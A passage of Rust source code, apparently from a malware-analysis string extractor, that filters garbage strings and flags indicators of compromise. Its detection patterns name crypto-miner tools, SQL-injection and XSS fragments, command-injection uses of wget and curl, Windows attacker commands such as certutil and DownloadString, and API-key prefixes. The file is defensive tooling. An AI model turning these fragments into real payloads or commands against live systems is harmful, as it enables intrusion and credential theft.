//! String validation utilities.
//!
//! Functions for validating and filtering string candidates to remove garbage
//! and low-quality strings.

use crate::validation_thresholds::*;

fn is_crypto_wallet_address(s: &str, len: usize) -> bool {
    if !(MIN_WALLET_LENGTH..=MAX_WALLET_LENGTH).contains(&len) {
        return false;
    }
    let looks_like_crypto = (s.starts_with('1') || s.starts_with('3'))
        || s.starts_with("bc1")
        || (s.starts_with("0x") && len == 42)
        || ((s.starts_with('4') || s.starts_with('8')) && len >= 90)
        || (s.starts_with('L') || s.starts_with('M'))
        || s.starts_with('D');
    if !looks_like_crypto {
        return false;
    }
    let alnum_count = s.bytes().filter(u8::is_ascii_alphanumeric).count();
    alnum_count * 100 / len >= MIN_WALLET_ALPHANUMERIC_RATIO
}

fn is_miner_ioc(s: &str) -> bool {
    if s.contains("stratum+tcp://") || s.contains("stratum+ssl://") {
        return true;
    }
    if (s.contains("pool.") || s.contains("nanopool") || s.contains("minergate"))
        && (s.contains(".com") || s.contains(".org") || s.contains(':'))
    {
        return true;
    }
    s.contains("xmrig")
        || s.contains("xmr-stak")
        || s.contains("cpuminer")
        || s.contains("ccminer")
        || s.contains("ethminer")
        || s.contains("phoenixminer")
        || s.contains("t-rex")
        || s.contains("--donate-level")
        || s.contains("--algo=")
        || s.contains("--cuda-devices")
        || (s.contains("-o ") && s.contains("-u "))
}

fn is_ctf_or_guid(s: &str, len: usize) -> bool {
    if !s.starts_with('{') || !s.ends_with('}') {
        return false;
    }
    if len > 5
        && (s.contains("CTF{")
            || s.contains("flag{")
            || s.contains("FLAG{")
            || s.contains("picoCTF{")
            || s.contains("HTB{"))
    {
        return true;
    }
    if (36..=38).contains(&len) {
        let dash_count = memchr::memchr_iter(b'-', s.as_bytes()).count();
        let hex_count = s.bytes().filter(u8::is_ascii_hexdigit).count();
        if dash_count == 4 && (30..=32).contains(&hex_count) {
            return true;
        }
    }
    false
}

fn is_email_address(s: &str, len: usize) -> bool {
    if !s.contains('@') || !s.contains('.') || len < 6 {
        return false;
    }
    let at_count = memchr::memchr_iter(b'@', s.as_bytes()).count();
    let dot_count = memchr::memchr_iter(b'.', s.as_bytes()).count();
    if at_count != 1 || dot_count < 1 {
        return false;
    }
    let valid_chars = s
        .chars()
        .filter(|c| c.is_alphanumeric() || matches!(c, '@' | '.' | '-' | '_' | '+'))
        .count();
    valid_chars * 100 / len >= MIN_EMAIL_VALID_CHAR_RATIO
}

fn is_jwt_token(s: &str, len: usize) -> bool {
    if s.matches('.').count() != 2 || len < 50 {
        return false;
    }
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 3 || !parts.iter().all(|p| !p.is_empty()) {
        return false;
    }
    let base64_chars = s
        .chars()
        .filter(|c| c.is_alphanumeric() || matches!(c, '.' | '-' | '_' | '='))
        .count();
    base64_chars * 100 / len >= 95
}

fn is_attack_payload(s: &str) -> bool {
    if (s.contains("' OR '") || s.contains("1'='1"))
        || (s.contains("UNION") && s.contains("SELECT"))
        || s.contains("admin'--")
    {
        return true;
    }
    (s.contains("<script>") && s.contains("</script>"))
        || (s.contains("onerror=") && s.contains("alert("))
        || s.starts_with("javascript:")
}

fn is_api_key_pattern(s: &str, len: usize) -> bool {
    let matches_prefix = (s.starts_with("AKIA") && len >= 20)
        || (s.starts_with("ghp_") && len >= 36)
        || (s.starts_with("sk_live_") || s.starts_with("pk_live_"))
        || (s.starts_with("xox") && len >= 30);
    if !matches_prefix {
        return false;
    }
    let alnum_count = s
        .chars()
        .filter(|c| c.is_alphanumeric() || *c == '_')
        .count();
    alnum_count * 100 / len >= MIN_BASE64_RATIO_FOR_KEYS
}

fn is_code_pattern(s: &str) -> bool {
    // C/C++ patterns
    if s.contains("__attribute__")
        || s.contains("#define")
        || s.contains("#include")
        || (s.contains("char *") && s.contains("0x"))
        || (s.contains("((") && s.contains("))") && s.contains("0x"))
    {
        return true;
    }
    // PHP patterns
    if s.contains("eval(")
        || s.contains("base64_decode(")
        || s.contains("$_GET")
        || s.contains("$_POST")
        || s.contains("$_SERVER")
        || s.contains("$_COOKIE")
        || s.contains("$GLOBALS")
        || s.contains("preg_replace(")
        || (s.starts_with("${") && s.contains('}'))
    {
        return true;
    }
    // Perl patterns
    if s.contains("pack(") || s.contains("$ARGV") || (s.contains("open(") && s.contains('|')) {
        return true;
    }
    // Shell patterns
    if s.contains("${IFS}")
        || (s.contains("$(") && s.contains(')'))
        || (s.contains("eval") && (s.contains("base64") || s.contains("echo")))
    {
        return true;
    }
    // Command injection patterns
    if (s.contains("; ") && (s.contains("cat") || s.contains("wget") || s.contains("curl")))
        || (s.contains("| ") && (s.contains("whoami") || s.contains("id") || s.contains("uname")))
        || (s.starts_with('`') && s.ends_with('`'))
    {
        return true;
    }
    // Windows malware commands
    if s.contains("schtasks")
        || s.contains("net user")
        || s.contains("reg add")
        || s.contains("powershell")
        || s.contains("certutil")
        || s.contains("mshta")
        || s.contains("IEX(")
        || s.contains("DownloadString")
    {
        return true;
    }
    // Ransom note patterns
    if s.contains("ENCRYPTED") || s.contains("DECRYPT") || s.contains("Bitcoin") {
        let uppercase_count = s.bytes().filter(u8::is_ascii_uppercase).count();
        if !s.is_empty() && uppercase_count * 100 / s.len() > 50 {
            return true;
        }
    }
    false
}

fn is_obfuscated_js(s: &str) -> bool {
    // Check for JS obfuscation patterns like _0x1234 or 0x1234
    // Must be followed by hex digits to avoid false positives from binary garbage
    let has_0x_pattern = s.contains("_0x")
        || s.chars()
            .zip(s.chars().skip(1))
            .zip(s.chars().skip(2))
            .any(|((a, b), c)| a == '0' && b == 'x' && c.is_ascii_hexdigit());

    if !has_0x_pattern || s.len() < 10 {
        return false;
    }

    // Also require ASCII-only content (JS is ASCII)
    // Any non-ASCII characters indicate this is not obfuscated JS
    if !s.is_ascii() {
        return false;
    }

    let has_keywords = s.contains("function")
        || s.contains("const")
        || s.contains("var")
        || s.contains("let")
        || s.contains("return")
        || s.contains("if");
    let has_code_syntax = s.contains('(') || s.contains('[') || s.contains('{');
    let hex_id_count = s.matches("_0x").count() + s.matches("0x").count();
    if has_keywords || has_code_syntax || hex_id_count >= 2 {
        let alnum_count = s.bytes().filter(u8::is_ascii_alphanumeric).count();
        if alnum_count >= 6 {
            return true;
        }
    }
    false
}

fn is_comma_separated_list(s: &str, len: usize) -> bool {
    if !s.contains(',') || len < 10 {
        return false;
    }
    let parts: Vec<&str> = s.split(',').collect();
    if parts.len() < 2 {
        return false;
    }
    let valid_parts = parts
        .iter()
        .filter(|p| {
            !p.is_empty()
                && p.chars()
                    .all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.')
        })
        .count();
    valid_parts * 100 / parts.len() >= 75
}

fn is_shell_command_string(s: &str) -> bool {
    let has_shell_indicator = s.contains("osascript")
        || s.contains("bash")
        || s.contains("/bin/sh")
        || s.contains("/bin/bash")
        || s.contains("2>&1")
        || s.contains("<<")
        || s.contains("2>/dev/null")
        || s.contains("2>")
        || (s.contains(" sh ") || s.starts_with("sh ") || s.ends_with(" sh"));
    if !has_shell_indicator {
        return false;
    }
    let special_count = s
        .chars()
        .filter(|c| !c.is_alphanumeric() && !c.is_whitespace())
        .count();
    let alnum_count = s.bytes().filter(u8::is_ascii_alphanumeric).count();
    if s.is_empty() {
        return false;
    }
    alnum_count * 100 / s.len() >= 40 && special_count <= alnum_count
}

fn is_mac_address_or_ipv6(s: &str, len: usize) -> bool {
    // MAC addresses
    if (12..=17).contains(&len) {
        let colon_count = memchr::memchr_iter(b':', s.as_bytes()).count();
        let dash_count = memchr::memchr_iter(b'-', s.as_bytes()).count();
        let dot_count = memchr::memchr_iter(b'.', s.as_bytes()).count();
        let hex_count = s.bytes().filter(u8::is_ascii_hexdigit).count();
        if (colon_count == 5 || dash_count == 5) && hex_count == 12 {
            return true;
        }
        if dot_count == 2 && hex_count == 12 {
            return true;
        }
    }
    // IPv6
    if len >= 3 && s.contains(':') {
        let colon_count = memchr::memchr_iter(b':', s.as_bytes()).count();
        let hex_count = s.bytes().filter(u8::is_ascii_hexdigit).count();
        if colon_count >= 2 && hex_count >= 1 {
            // Reject trailing colons (invalid IPv6, unless ::)
            if s.ends_with(':') && !s.ends_with("::") {
                return false;
            }
            // Reject leading colons (invalid unless ::)
            if s.starts_with(':') && !s.starts_with("::") {
                return false;
            }
            // Reject 3+ consecutive colons (only :: is valid)
            if s.contains(":::") {
                return false;
            }
            // Reject multiple :: occurrences
            if s.matches("::").count() > 1 {
                return false;
            }
            let hex_and_colon = s
                .chars()
                .filter(|c| c.is_ascii_hexdigit() || *c == ':' || *c == '.')
                .count();
            if hex_and_colon * 100 / len > 80 {
                return true;
            }
        }
    }
    false
}

fn is_locale_code(s: &str, len: usize) -> bool {
    if len != 5 && len != 6 {
        return false;
    }
    let chars: Vec<char> = s.chars().collect();
    if chars.len() < 5 {
        return false;
    }
    (chars[0].is_ascii_lowercase()
        && chars[1].is_ascii_lowercase()
        && chars[2] == '_'
        && chars[3].is_ascii_uppercase()
        && chars[4].is_ascii_uppercase())
        || (chars.len() == 6
            && chars[0].is_ascii_lowercase()
            && chars[1].is_ascii_lowercase()
            && chars[2].is_ascii_lowercase()
            && chars[3] == '_'
            && chars[4].is_ascii_uppercase()
            && chars[5].is_ascii_uppercase())
}

struct CharStats {
    upper: usize,
    lower: usize,
    digit: usize,
    alpha: usize,
    whitespace: usize,
    noise_punct: usize,
    open_parens: usize,
    close_parens: usize,
    quotes: usize,
    special: usize,
    hex_only: usize,
    ascii_count: usize,
    alternations: usize,
    first_char: char,
    last_char: char,
    all_same: bool,
    has_non_hex_letter: bool,
    alphanumeric: usize,
    char_count: usize,
}

impl CharStats {
    fn from_str(s: &str) -> Self {
        let mut upper = 0usize;
        let mut lower = 0usize;
        let mut digit = 0usize;
        let mut alpha = 0usize;
        let mut whitespace = 0usize;
        let mut noise_punct = 0usize;
        let mut open_parens = 0usize;
        let mut close_parens = 0usize;
        let mut quotes = 0usize;
        let mut special = 0usize;
        let mut hex_only = 0usize;
        let mut ascii_count = 0usize;
        let mut alternations = 0usize;
        let mut prev_is_digit: Option<bool> = None;
        let mut first_char_opt: Option<char> = None;
        let mut all_same = true;
        let mut last_char = '\0';
        let mut has_non_hex_letter = false;
        let mut char_count = 0usize;

        for c in s.chars() {
            char_count += 1;
            if first_char_opt.is_none() {
                first_char_opt = Some(c);
            } else if all_same && Some(c) != first_char_opt {
                all_same = false;
            }
            last_char = c;

            if c.is_ascii() {
                ascii_count += 1;
            }

            if c.is_ascii_uppercase() {
                upper += 1;
                alpha += 1;
                if !c.is_ascii_hexdigit() {
                    has_non_hex_letter = true;
                }
                hex_only += 1;
                if prev_is_digit == Some(true) {
                    alternations += 1;
                }
                prev_is_digit = Some(false);
            } else if c.is_ascii_lowercase() {
                lower += 1;
                alpha += 1;
                if !c.is_ascii_hexdigit() {
                    has_non_hex_letter = true;
                }
                hex_only += 1;
                if prev_is_digit == Some(true) {
                    alternations += 1;
                }
                prev_is_digit = Some(false);
            } else if c.is_ascii_digit() {
                digit += 1;
                hex_only += 1;
                if prev_is_digit == Some(false) {
                    alternations += 1;
                }
                prev_is_digit = Some(true);
            } else if c.is_alphabetic() {
                alpha += 1;
                if prev_is_digit == Some(true) {
                    alternations += 1;
                }
                prev_is_digit = Some(false);
            } else if c.is_whitespace() {
                whitespace += 1;
            } else {
                match c {
                    '#' | '@' | '?' | '>' | '<' | '|' | '\\' | '^' | '`' | '~' | '$' | '+'
                    | '&' | '*' | '=' | ';' | ':' | '!' | ',' => noise_punct += 1,
                    '(' | '[' | '{' => open_parens += 1,
                    ')' | ']' | '}' => close_parens += 1,
                    '"' | '\'' => quotes += 1,
                    _ => {}
                }
                if !c.is_alphanumeric() && !c.is_whitespace() {
                    special += 1;
                }
            }
        }

        let first_char = first_char_opt.unwrap_or(' ');
        let alphanumeric = alpha + digit;

        Self {
            upper,
            lower,
            digit,
            alpha,
            whitespace,
            noise_punct,
            open_parens,
            close_parens,
            quotes,
            special,
            hex_only,
            ascii_count,
            alternations,
            first_char,
            last_char,
            all_same,
            has_non_hex_letter,
            alphanumeric,
            char_count,
        }
    }
}

/// Returns true if a very short string (2-6 chars) looks like random binary garbage.
fn is_short_identifier_garbage(s: &str, len: usize, stats: &CharStats) -> bool {
    if !(SHORT_IDENTIFIER_MIN_LEN..=SHORT_IDENTIFIER_MAX_LEN).contains(&len) {
        return false;
    }
    let is_all_upper = stats.upper == len;
    let is_all_lower = stats.lower == len;
    let is_all_digit = stats.digit == len;
    // Digit + uppercase patterns like "8BIM", "3DES" are valid
    // But single leading 0 or 1 is suspicious (real identifiers use meaningful numbers)
    let chars: Vec<char> = s.chars().collect();
    let has_suspicious_leading_digit = (stats.first_char == '0' || stats.first_char == '1')
        && chars.len() > 1
        && !chars[1].is_ascii_digit(); // Single 0 or 1 at start, not part of larger number
    let is_digit_upper_id = stats.first_char.is_ascii_digit()
        && stats.upper > 0
        && stats.lower == 0
        && stats.special == 0
        && !has_suspicious_leading_digit
        && s.chars()
            .skip_while(char::is_ascii_digit)
            .all(|c| c.is_ascii_uppercase());
    let is_pascal_case = stats.first_char.is_ascii_uppercase()
        && stats.upper == 1
        && stats.lower > 0
        && stats.digit == 0;
    let last_char = stats.last_char;
    let is_camel_case = len >= 7
        && stats.first_char.is_ascii_lowercase()
        && stats.upper == 1
        && stats.digit == 0
        && !last_char.is_ascii_uppercase();
    let is_lower_with_suffix = stats.first_char.is_ascii_lowercase()
        && stats.lower > 0
        && stats.upper == 0
        && stats.digit > 0
        && last_char.is_ascii_digit();

    // Alphanumeric identifiers with consistent case are usually valid:
    // - File signatures: "BSJB", "RIFF", "8BIM"
    // - Algorithms/encodings: "UTF8", "SHA256", "BASE64", "UTF16LE"
    // - Architecture names: "amd64", "arm64"
    // Rule: 4-8 chars, alphanumeric only, letters in consistent case,
    // and doesn't have digits at BOTH ends (like "0YI0" which is garbage),
    // and doesn't have single 0 or 1 as leading digit (handled by has_suspicious_leading_digit above)
    let is_consistent_case_alphanum = (4..=8).contains(&len)
        && stats.special == 0
        && stats.digit > 0
        && stats.alpha > 0
        && (stats.lower == 0 || stats.upper == 0)
        && !(stats.first_char.is_ascii_digit() && stats.last_char.is_ascii_digit())
        && !has_suspicious_leading_digit;

    // Check for consonant-only strings (no vowels) - likely random garbage
    // unless it's a known pattern like "str", "ptr", "chr", "src", etc.
    if is_all_lower && len >= 4 {
        let vowel_count = s
            .bytes()
            .filter(|&b| matches!(b, b'a' | b'e' | b'i' | b'o' | b'u'))
            .count();
        if vowel_count == 0 {
            // Whitelist common consonant-only strings
            let known = [
                "str", "ptr", "chr", "src", "dst", "tmp", "prn", "sys", "cfg", "mgr", "ctx",
            ];
            if !known.contains(&s) {
                return true;
            }
        }
    }

    if is_all_upper
        || is_all_lower
        || is_all_digit
        || is_digit_upper_id
        || is_pascal_case
        || is_camel_case
        || is_lower_with_suffix
        || is_consistent_case_alphanum
    {
        return false;
    }
    if stats.digit > 0 && (stats.upper > 0 || stats.lower > 0) {
        return true;
    }
    if stats.upper > 0 && stats.lower > 0 {
        return true;
    }
    if stats.whitespace > 0 {
        return true;
    }
    false
}

/// Returns true if a short string (<=6 chars) looks like misaligned binary data.
fn is_short_binary_garbage(s: &str, len: usize, stats: &CharStats) -> bool {
    if len > 6 {
        return false;
    }
    if stats.upper > 0 && stats.special > 0 && stats.alpha == stats.upper {
        return true;
    }
    if stats.special > 0 && len <= 5 {
        let dot_count = memchr::memchr_iter(b'.', s.as_bytes()).count();
        if dot_count == stats.special {
            let is_filename_pattern =
                (dot_count == 1 && !s.starts_with('.') && !s.ends_with('.')) || s.starts_with('.');
            if !is_filename_pattern || stats.alphanumeric == 0 {
                return true;
            }
        } else {
            return true;
        }
    }
    false
}

/// Detect PE relocation table patterns like "xçx&xìxÇx..." or "uHu}uQu\uYu0u"
/// where a single lowercase letter repeats frequently with other characters between.
fn is_reloc_table_pattern(s: &str, len: usize) -> bool {
    if len < 8 {
        return false;
    }

    let chars: Vec<char> = s.chars().collect();
    let char_count = chars.len();
    if char_count < 6 {
        return false;
    }

    // Count frequency of each lowercase letter
    let mut letter_counts = [0u32; 26];
    let mut non_ascii_count = 0;
    let mut special_count = 0;
    let mut uppercase_count = 0;
    let mut digit_count = 0;

    for &c in &chars {
        if c.is_ascii_lowercase() {
            letter_counts[(c as u8 - b'a') as usize] += 1;
        } else if !c.is_ascii() {
            non_ascii_count += 1;
        } else if c.is_ascii_uppercase() {
            uppercase_count += 1;
        } else if c.is_ascii_digit() {
            digit_count += 1;
        } else if !c.is_alphanumeric() {
            special_count += 1;
        }
    }

    // Find the most frequent lowercase letter
    let max_letter_count = letter_counts.iter().max().copied().unwrap_or(0) as usize;

    // If a single letter appears very frequently (>25% of chars) AND
    // there are non-ASCII or special chars, it's likely a reloc pattern
    // e.g., "x xçx&xìxÇx..." has 'x' appearing ~50% of the time
    if max_letter_count >= 4
        && max_letter_count * 100 / char_count >= 25
        && (non_ascii_count >= 2 || (non_ascii_count >= 1 && special_count >= 2))
    {
        return true;
    }

    // All-ASCII reloc patterns: a single lowercase letter dominates with
    // uppercase letters, digits, and special chars like {, }, \, ^
    // e.g., "uHu}uQu\uYu0u", "t{t\tYt0t8t"
    // Key: one letter > 35% of chars, mixed with uppercase/digits/special
    if max_letter_count >= 3
        && max_letter_count * 100 / char_count >= 35
        && non_ascii_count == 0
        && char_count <= 25
    {
        // Need mix of: uppercase + (digits or special)
        let has_uppercase = uppercase_count >= 1;
        let has_digits = digit_count >= 1;
        let has_special = special_count >= 1;

        // Pattern like uHu}uQu\uYu0u: uppercase, special, digits
        if has_uppercase && (has_digits || has_special) && (uppercase_count + special_count) >= 2 {
            return true;
        }
    }

    false
}

/// Returns true if the string has excessive non-ASCII content indicating corrupted/garbage data.
fn has_excess_non_ascii(s: &str, len: usize, stats: &CharStats) -> bool {
    let non_ascii_count = len - stats.ascii_count;
    if non_ascii_count == 0 {
        return false;
    }

    // Check for PE relocation table patterns first
    if is_reloc_table_pattern(s, len) {
        return true;
    }

    // Strings that are 100% non-ASCII and short are almost always garbage
    // (random bytes decoded as UTF-8), unless they're a single character
    if stats.ascii_count == 0 && len > 1 && len < 50 {
        return true;
    }

    if len < 30 {
        let alpha_percentage = if stats.char_count > 0 {
            stats.alpha * 100 / stats.char_count
        } else {
            0
        };
        let has_noise_punct = s.chars().any(|c| {
            matches!(
                c,
                '?' | '\u{00A5}'
                    | '\u{00B5}'
                    | '\u{00A8}'
                    | '\u{00B4}'
                    | '\u{00BB}'
                    | '\u{00AB}'
                    | '\u{00B0}'
                    | '\u{00B7}'
                    | '\u{00A6}'
                    | '\u{00AF}'
            )
        });
        if (alpha_percentage < MIN_NON_ASCII_ALPHABETIC_RATIO || has_noise_punct)
            && non_ascii_count * 100 / len > MAX_NON_ASCII_RATIO
        {
            return true;
        }
        if len < SHORT_NON_ASCII_CHECK_LEN && non_ascii_count >= MIN_NON_ASCII_COUNT_SHORT {
            return true;
        }

        // Multiple non-ASCII chars in short strings with mixed case is likely garbage
        // e.g., "uDuntßñ6OlÇÕ" - even if they're alphabetic, the pattern is random
        if non_ascii_count >= 3 && len < 20 && stats.upper > 0 && stats.lower > 0 {
            // If has digits mixed in, even more suspicious
            if stats.digit > 0 {
                return true;
            }
            // If has 3+ non-ASCII characters in a short string, likely garbage
            // unless it's a recognizable language pattern
            let non_ascii_ratio = non_ascii_count * 100 / len;
            if non_ascii_ratio > 25 {
                return true;
            }
        }

        // Repetitive patterns with non-ASCII are likely misaligned binary data
        // e.g., "zçz&zÇzÌzhzµzyz½z{zHz}zQz..." - single char repeated with noise
        if non_ascii_count >= 3 && stats.noise_punct >= 3 {
            return true;
        }
    } else {
        // Longer strings (>=30 chars)
        if non_ascii_count * 100 / len > 30 {
            return true;
        }
        // Repetitive patterns with non-ASCII and noise punctuation
        if non_ascii_count >= 3 && stats.noise_punct >= 3 {
            return true;
        }
    }

    // Detect repetitive single-char patterns like "zçz&zÇz..." where one letter
    // appears very frequently (>30% of chars) with non-ASCII mixed in
    if non_ascii_count >= 1 && len >= 10 {
        let mut char_counts = [0u8; 128]; // ASCII frequency counter
        for c in s.chars() {
            if c.is_ascii() {
                let idx = c as usize;
                if idx < 128 && char_counts[idx] < 255 {
                    char_counts[idx] += 1;
                }
            }
        }
        // Find max frequency
        let max_freq = char_counts.iter().max().copied().unwrap_or(0) as usize;
        // If any single ASCII char appears in more than 30% of positions, suspicious
        if max_freq * 100 / len > 30 {
            return true;
        }
    }

    // Short strings (4-8 chars) starting with digit + non-ASCII are garbage
    // e.g., "7üĐō", "4ÛŷƮ", "6Æťƒ" - random bytes decoded as UTF-8
    // Use char_count for proper Unicode handling
    if non_ascii_count >= 1 && stats.char_count <= 8 && stats.first_char.is_ascii_digit() {
        return true;
    }

    false
}

/// Returns true if the string's character class run pattern indicates random/garbage data.
fn has_chaotic_char_pattern(s: &str, len: usize, stats: &CharStats) -> bool {
    if len < 6 {
        return false;
    }

    #[derive(PartialEq, Eq, Clone, Copy)]
    enum CharClass {
        Upper,
        Lower,
        Digit,
        Special,
        Whitespace,
    }

    let char_classes: Vec<CharClass> = s
        .chars()
        .map(|c| {
            if c.is_ascii_uppercase() {
                CharClass::Upper
            } else if c.is_ascii_lowercase() {
                CharClass::Lower
            } else if c.is_ascii_digit() {
                CharClass::Digit
            } else if c.is_whitespace() {
                CharClass::Whitespace
            } else {
                CharClass::Special
            }
        })
        .collect();

    let mut transitions = 0;
    let mut run_lengths: Vec<usize> = Vec::new();
    let mut current_run_length = 1;

    for i in 1..char_classes.len() {
        if char_classes[i] == char_classes[i - 1] {
            current_run_length += 1;
        } else {
            transitions += 1;
            run_lengths.push(current_run_length);
            current_run_length = 1;
        }
    }
    run_lengths.push(current_run_length);

    let total_run_chars: usize = run_lengths.iter().sum();
    let avg_run_length = if run_lengths.is_empty() {
        0.0
    } else {
        total_run_chars as f32 / run_lengths.len() as f32
    };

    let max_class_count = stats
        .upper
        .max(stats.lower)
        .max(stats.digit)
        .max(stats.special);
    let is_mostly_one_class = max_class_count * 100 / len > MAX_CLASS_DOMINANCE_RATIO;

    let alphanumeric = stats.alphanumeric;
    let lower = stats.lower;
    let special = stats.special;
    let digit = stats.digit;

    let looks_like_path = (s.contains('/') || s.contains('\\'))
        && alphanumeric >= 3
        && special * 100 / len <= MAX_SPECIAL_RATIO_FOR_PATHS
        && (alphanumeric == 0 || lower * 100 / alphanumeric >= MIN_LOWERCASE_RATIO_FOR_PATHS)
        && (s.starts_with('/')
            || s.starts_with('\\')
            || s.contains("/.")
            || s.contains("\\.")
            || s.split(&['/', '\\'][..])
                .filter(|seg| !seg.is_empty())
                .count()
                >= 2);
    let looks_like_url = s.contains("://") || s.contains("http");
    let looks_like_domain = s.contains('.')
        && s.split('.').filter(|seg| !seg.is_empty()).count() >= MIN_SEGMENT_COUNT
        && special * 100 / len <= MAX_SPECIAL_RATIO_FOR_DOMAINS;
    let looks_like_version = (s.starts_with("go") || s.starts_with('v') || s.starts_with('V'))
        && s.contains('.')
        && digit > 0;
    let looks_like_base64 = len >= MIN_BASE64_LENGTH
        && stats.upper > 0
        && lower > 0
        && s.chars()
            .all(|c| c.is_alphanumeric() || c == '+' || c == '/' || c == '=');
    let looks_like_format_string = s.contains("%s")
        || s.contains("%d")
        || s.contains("%f")
        || s.contains("%x")
        || s.contains("%v")
        || s.contains("%p")
        || s.contains("%c")
        || s.contains("%u");
    let is_structured_pattern = looks_like_path
        || looks_like_url
        || looks_like_domain
        || looks_like_version
        || looks_like_base64
        || looks_like_format_string;

    if !is_mostly_one_class && !is_structured_pattern {
        if transitions * 100 / len > MAX_TRANSITION_RATIO {
            return true;
        }
        if avg_run_length < MAX_AVG_RUN_LENGTH_CHAOS && len >= 8 {
            return true;
        }
        if len <= 7 && avg_run_length < 1.5 && transitions >= 4 {
            return true;
        }
    } else if is_structured_pattern
        && avg_run_length < 2.0
        && len >= 10
        && !looks_like_path
        && !looks_like_domain
        && !looks_like_version
        && !looks_like_base64
        && !looks_like_format_string
        && !looks_like_url
    {
        return true;
    }
    false
}

/// Determines if a string appears to be garbage/noise rather than meaningful content.
///
/// Fast path: Check if long strings with normal patterns are obviously valid.
///
/// This avoids expensive analysis for the common case.
fn is_fast_path_valid(s: &str, len: usize) -> bool {
    if len >= MIN_FAST_PATH_VALID_LENGTH {
        let bytes = s.as_bytes();
        let first = bytes[0];
        // Quick check for all-same-character strings (garbage)
        if bytes.iter().all(|&b| b == first) {
            return false; // Not valid - it's garbage
        }
        // If it starts with a letter and has mostly alphanumeric + common punctuation, it's valid
        if first.is_ascii_alphabetic() {
            let simple_chars = bytes
                .iter()
                .filter(|&&b| {
                    b.is_ascii_alphanumeric()
                        || b == b' '
                        || b == b'_'
                        || b == b'-'
                        || b == b'.'
                        || b == b'/'
                })
                .count();
            if simple_chars * 100 / bytes.len() >= MIN_FAST_PATH_ALPHABETIC_RATIO {
                // Additional check: reject reloc-like patterns where a single letter dominates
                // Count frequency of each lowercase letter
                let mut letter_counts = [0u32; 26];
                for &b in bytes {
                    if b.is_ascii_lowercase() {
                        letter_counts[(b - b'a') as usize] += 1;
                    }
                }
                let max_letter = letter_counts.iter().max().copied().unwrap_or(0) as usize;
                let char_count = s.chars().count();

                let has_non_ascii = bytes.iter().any(|&b| !b.is_ascii());
                if has_non_ascii {
                    // If one letter appears in >30% of chars with non-ASCII, it's a reloc pattern
                    if char_count > 0 && max_letter * 100 / char_count > 30 {
                        return false;
                    }
                } else if char_count <= 25 && max_letter >= 3 {
                    // All-ASCII reloc patterns: short strings with dominant letter
                    // and mix of uppercase + (digits or special)
                    let ratio = max_letter * 100 / char_count;
                    if ratio >= 35 {
                        let uppercase = bytes.iter().filter(|b| b.is_ascii_uppercase()).count();
                        let digit = bytes.iter().filter(|b| b.is_ascii_digit()).count();
                        let special = bytes
                            .iter()
                            .filter(|&&b| b.is_ascii() && !b.is_ascii_alphanumeric() && b != b' ')
                            .count();
                        // Must have uppercase and either digits or special chars
                        if uppercase >= 2 && (digit >= 1 || special >= 2) {
                            return false;
                        }
                    }
                }
                return true;
            }
        }
    }

    // If classify_string recognizes this as a meaningful type, it is not garbage.
    // This covers emails, URLs, IPs, crypto wallets, JWTs, API keys, shell commands,
    // SQL injection, registry paths, and all other classified string kinds.
    // Restricted to ASCII strings: non-ASCII content requires full heuristic analysis
    // because the classifier doesn't account for non-ASCII garbage from misaligned reads.
    if s.is_ascii() && crate::go::classify_string(s) != crate::types::StringKind::Const {
        return true;
    }

    false
}

/// Fast path: Check if string is obviously garbage without deep analysis.
fn is_fast_path_garbage(s: &str, original: &str, len: usize) -> bool {
    // Empty or single character
    if len == 0 || len == 1 {
        return true;
    }

    // Reject strings with embedded control characters (except trailing newlines).
    let check_control = original.trim_end_matches('\n');
    if check_control.chars().any(char::is_control) {
        return true;
    }

    // Trailing spaces after short content indicate misaligned reads
    // Check original string before trimming
    if original.ends_with(' ') && original.len() < 10 {
        let alphanumeric = original.bytes().filter(u8::is_ascii_alphanumeric).count();
        if alphanumeric < 4 {
            return true;
        }
    }

    // Leading whitespace in short strings (like " 3343") is garbage
    if original.starts_with(' ') && original.len() < 15 {
        return true;
    }

    // Short strings with comma not in list context (no spaces around it) are garbage
    // e.g., "Zuçzj,w9m" - comma embedded in gibberish
    if s.contains(',') && len < 15 && !s.contains(", ") && !s.contains(" ,") {
        // Exception: numbers with commas (e.g., "1,000") are OK if mostly digits
        let digit_count = s.bytes().filter(u8::is_ascii_digit).count();
        let comma_count = memchr::memchr_iter(b',', s.as_bytes()).count();
        if digit_count * 2 < len - comma_count {
            // Not a number, and comma without space = garbage
            return true;
        }
    }

    // Literal escape sequences in short strings without code context are garbage.
    if len < MAX_SHORT_ESCAPE_LENGTH
        && (s.contains("\\x") || s.contains("\\u") || s.contains("\\U"))
    {
        let has_code_context = s.contains('"')
            || s.contains('\'')
            || s.contains('(')
            || s.contains('[')
            || s.contains("print")
            || s.contains("echo")
            || s.contains("const")
            || s.contains("var");
        if !has_code_context {
            return true;
        }
    }

    false
}

/// Check if string matches known Indicator of Compromise patterns.
///
/// These are high-value strings that should never be filtered.
fn is_recognized_ioc(s: &str, len: usize) -> bool {
    // Crypto and malware IOCs
    if is_crypto_wallet_address(s, len) {
        return true;
    }
    if is_miner_ioc(s) {
        return true;
    }
    if s.contains(".onion") && len >= 10 {
        return true;
    }

    // Authentication and tokens
    if is_ctf_or_guid(s, len) {
        return true;
    }
    if is_email_address(s, len) {
        return true;
    }
    if is_jwt_token(s, len) {
        return true;
    }
    if is_api_key_pattern(s, len) {
        return true;
    }

    // System paths and registries
    if s.contains("HKLM\\") || s.contains("HKCU\\") || s.contains("HKEY_") {
        return true;
    }
    if s.contains("LDAP://") || (s.contains("CN=") && s.contains("DC=")) {
        return true;
    }

    // Cryptographic materials
    if s.contains("-----BEGIN") || s.contains("-----END") {
        return true;
    }

    // Attack patterns and code
    if is_attack_payload(s) {
        return true;
    }
    if is_code_pattern(s) {
        return true;
    }
    if is_obfuscated_js(s) {
        return true;
    }

    // Network and protocols
    if is_mac_address_or_ipv6(s, len) {
        return true;
    }

    // HTTP headers
    if (s.starts_with("Host:")
        || s.starts_with("User-Agent:")
        || s.starts_with("Content-Type:")
        || s.starts_with("Accept:")
        || s.starts_with("Authorization:")
        || s.starts_with("Cookie:"))
        && len >= 10
    {
        return true;
    }

    // Structured data
    if is_comma_separated_list(s, len) {
        return true;
    }
    if is_shell_command_string(s) {
        return true;
    }

    // Long hex strings are crypto hashes or keys
    if (MIN_HASH_LENGTH..=MAX_HASH_LENGTH).contains(&len) {
        let hex_count = s.bytes().filter(u8::is_ascii_hexdigit).count();
